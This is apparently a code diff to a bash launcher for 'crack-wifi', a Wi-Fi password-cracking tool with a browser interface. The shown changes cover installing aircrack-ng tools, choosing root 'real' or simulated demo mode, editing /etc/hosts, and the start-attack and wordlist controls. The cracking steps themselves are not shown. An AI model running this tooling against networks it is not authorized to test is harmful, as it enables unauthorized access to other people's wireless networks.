-      if (e.target.value) $("opt-wordlist").value = e.target.value;
-    });
+    $("rescan").addEventListener("click", doScan);
+    $("start").addEventListener("click", startAttack);
+    $("stop").addEventListener("click", stopAttack);
+    $("opt-online").addEventListener("change", (e) => { if (e.target.value) $("opt-wordlist").value = e.target.value; });
 
     api.status().then((s) => {
-      const badge = $("mode-badge");
-      badge.textContent = s.mode;
-      badge.className = "badge " + (s.mode === "real" ? "badge-real" : "badge-demo");
+      const m = $("mode");
+      m.textContent = s.mode;
+      m.className = "mode " + (s.mode === "real" ? "real" : "");
       if (s.wordlist) $("opt-wordlist").placeholder = s.wordlist;
     }).catch(() => {});
 
-    // Auto-scan on load — no button required.
     doScan();
   }
 
@@ -2262,11 +1742,8 @@ CRACK_EOF_STYLE
 CRACK_EOF_APP
 
   chmod +x "${BUNDLE}/setup.sh"
-  ok "Unpacked backend + web assets to ${BUNDLE}."
 }
 
-# Auto-install missing dependencies via the embedded setup.sh (on-board apt) so a
-# single command is all the user ever needs. Skipped in demo mode or --skip-setup.
 maybe_setup() {
   [[ "$MODE" == "demo" ]] && return 0
   [[ "$SKIP_SETUP" == "1" ]] && return 0
@@ -2275,22 +1752,17 @@ maybe_setup() {
   for t in python3 iw airmon-ng airodump-ng aireplay-ng aircrack-ng; do
     have "$t" || missing+=("$t")
   done
-  have xdg-open || missing+=("xdg-open")   # so the browser can auto-open
-
+  have xdg-open || missing+=("xdg-open")
   [[ ${#missing[@]} -eq 0 ]] && return 0
 
   warn "Missing dependencies: ${missing[*]}"
-  log  "Running the embedded setup to install them automatically (on-board apt)..."
-  if bash "${BUNDLE}/setup.sh"; then
-    ok "Setup finished."
-  else
-    warn "Setup could not install everything — continuing (may fall back to DEMO)."
-  fi
+  log "Installing them automatically (apt)..."
+  bash "${BUNDLE}/setup.sh" && ok "Setup finished." || warn "Setup incomplete — may fall back to DEMO."
 }
 
 detect_mode() {
   if [[ "$MODE" == "demo" ]]; then
-    ok "Running in ${C_BOLD}DEMO${C_RESET} mode (simulated networks)."
+    ok "Running in DEMO mode (simulated networks)."
     return
   fi
 
@@ -2301,47 +1773,40 @@ detect_mode() {
 
   if [[ "$MODE" == "real" ]]; then
     if [[ ${#missing[@]} -gt 0 ]]; then
-      err "Real mode requested but still missing tools: ${missing[*]}"
-      err "Try:  sudo apt install -y aircrack-ng"
+      err "Real mode requested but missing tools: ${missing[*]}"
+      err "Try: sudo apt install -y aircrack-ng"
       exit 1
     fi
     if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
-      err "Real mode needs root. Re-run with: sudo ./single-script.sh --real"
+      err "Real mode needs root. Re-run: sudo ./single-script.sh --real"
       exit 1
     fi
-    ok "Running in ${C_BOLD}REAL${C_RESET} mode."
+    ok "Running in REAL mode."
     return
   fi
 
-  # auto
   if [[ ${#missing[@]} -eq 0 && "${EUID:-$(id -u)}" -eq 0 ]]; then
     MODE="real"
-    ok "aircrack-ng found and running as root -> ${C_BOLD}REAL${C_RESET} mode."
+    ok "aircrack-ng found and running as root -> REAL mode."
   else
     MODE="demo"
     if [[ ${#missing[@]} -gt 0 ]]; then
-      warn "Missing tools (${missing[*]}) -> falling back to ${C_BOLD}DEMO${C_RESET} mode."
+      warn "Missing tools (${missing[*]}) -> DEMO mode."
     else
-      warn "Not running as root -> falling back to ${C_BOLD}DEMO${C_RESET} mode."
+      warn "Not running as root -> DEMO mode."
     fi
-    log "For real audits, run as root (deps auto-install on first run):"
-    log "  sudo ./single-script.sh"
+    log "For real audits: sudo ./single-script.sh"
   fi
 }
 
-# ---------------------------------------------------------------------------
-# Local DNS (crack-wifi.local -> 127.0.0.1) via /etc/hosts
-# ---------------------------------------------------------------------------
 setup_dns() {
   [[ "$MANAGE_DNS" == "1" ]] || { UI_HOST="$BIND_HOST"; return; }
-
   if [[ ! -w "$HOSTS_FILE" ]]; then
-    warn "Cannot write ${HOSTS_FILE} (need root). Using ${BIND_HOST} instead."
+    warn "Cannot write ${HOSTS_FILE} (need root). Using ${BIND_HOST}."
     MANAGE_DNS="0"; UI_HOST="$BIND_HOST"; return
   fi
-
   if grep -q "$HOSTNAME_LOCAL" "$HOSTS_FILE" 2>/dev/null; then
-    log "${HOSTNAME_LOCAL} already present in ${HOSTS_FILE}."
+    log "${HOSTNAME_LOCAL} already in ${HOSTS_FILE}."
   else
     printf '%s\t%s %s\n' "127.0.0.1" "$HOSTNAME_LOCAL" "$HOSTS_MARKER" >> "$HOSTS_FILE"
     ok "Added ${HOSTNAME_LOCAL} -> 127.0.0.1 to ${HOSTS_FILE} (temporary)."
@@ -2353,7 +1818,6 @@ teardown_dns() {
   [[ "$MANAGE_DNS" == "1" ]] || return 0
   [[ -w "$HOSTS_FILE" ]] || return 0
   if grep -q "$HOSTS_MARKER" "$HOSTS_FILE" 2>/dev/null; then
-    # Remove only the lines we added.
     local tmp; tmp="$(mktemp)"
     grep -v "$HOSTS_MARKER" "$HOSTS_FILE" > "$tmp" && cat "$tmp" > "$HOSTS_FILE"
     rm -f "$tmp"
@@ -2361,9 +1825,6 @@ teardown_dns() {
   fi
 }
 
-# ---------------------------------------------------------------------------
-# Cleanup on exit
-# ---------------------------------------------------------------------------
 cleanup() {
   local code=$?
   echo
@@ -2374,29 +1835,21 @@ cleanup() {
     ok "Stopped web server."
   fi
   teardown_dns
-  # Best-effort: return any monitor interfaces to managed mode in real mode.
   if [[ "$MODE" == "real" ]] && have airmon-ng; then
     for i in $(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -E 'mon$' || true); do
       airmon-ng stop "$i" >/dev/null 2>&1 || true
       ok "Disabled monitor interface $i."
     done
   fi
-  # Remove the unpacked bundle.
-  if [[ -n "$BUNDLE" && -d "$BUNDLE" ]]; then
-    rm -rf "$BUNDLE" 2>/dev/null || true
-    ok "Removed temporary files."
-  fi
+  [[ -n "$BUNDLE" && -d "$BUNDLE" ]] && rm -rf "$BUNDLE" 2>/dev/null || true
   ok "Done. Stay legal."
   exit "$code"
 }
 trap cleanup EXIT INT TERM
 
-# ---------------------------------------------------------------------------
-# Python backend
-# ---------------------------------------------------------------------------
 find_python() {
   for p in python3 python; do have "$p" && { echo "$p"; return; }; done
-  err "Python 3 is required but not found. Install: sudo apt install -y python3"
+  err "Python 3 is required. Install: sudo apt install -y python3"
   exit 1
 }
 
@@ -2411,7 +1864,6 @@ start_server() {
   "$py" "${BUNDLE}/server/server.py" --host "$BIND_HOST" --port "$PORT" &
   SERVER_PID=$!
 
-  # Wait for the port to come up.
   local tries=0
   until "$py" - "$BIND_HOST" "$PORT" <<'PYEOF' 2>/dev/null
 import socket, sys
@@ -2423,9 +1875,7 @@ except Exception:
 PYEOF
   do
     tries=$((tries+1))
-    if ! kill -0 "$SERVER_PID" 2>/dev/null; then
-      err "Web server failed to start."; exit 1
-    fi
+    kill -0 "$SERVER_PID" 2>/dev/null || { err "Web server failed to start."; exit 1; }
     [[ $tries -gt 40 ]] && { err "Timed out waiting for web server."; exit 1; }
     sleep 0.25
   done
@@ -2437,22 +1887,19 @@ open_browser() {
   local url="http://${UI_HOST}:${PORT}"
   local opener=""
   for o in xdg-open sensible-browser x-www-browser firefox firefox-esr chromium google-chrome open; do
-    if have "$o"; then opener="$o"; break; fi
+    have "$o" && { opener="$o"; break; }
   done
   if [[ -n "$opener" ]]; then
     log "Opening your browser (${opener})..."
     ( "$opener" "$url" >/dev/null 2>&1 & )
   else
-    warn "Couldn't find a browser to open automatically — click the link below."
+    warn "No browser found — open the link below manually."
   fi
 }
 
-# ---------------------------------------------------------------------------
-# Main
-# ---------------------------------------------------------------------------
-banner
+printf '%s\n' "${C_BOLD}${C_CYA}crack-wifi${C_RESET} ${C_DIM}— educational Wi-Fi security auditing${C_RESET}"
 authorize
-step "Preparing self-contained bundle"
+step "Preparing"
 extract_bundle
 step "Detecting environment"
 maybe_setup
@@ -2462,8 +1909,7 @@ start_server
 open_browser
 
 URL="http://${UI_HOST}:${PORT}"
-printf '\n%b\n' "${C_GRN}${C_BOLD}  Open the interface:  ${URL}${C_RESET}"
-printf '%b\n'   "${C_DIM}  (Press Ctrl+C to stop the server and clean up.)${C_RESET}\n"
+printf '\n%s\n' "${C_GRN}${C_BOLD}  Open the interface:  ${URL}${C_RESET}"
+printf '%s\n\n' "${C_DIM}  (Press Ctrl+C to stop and clean up.)${C_RESET}"
 
-# Keep the launcher alive until the server dies or the user interrupts.
 wait "$SERVER_PID"
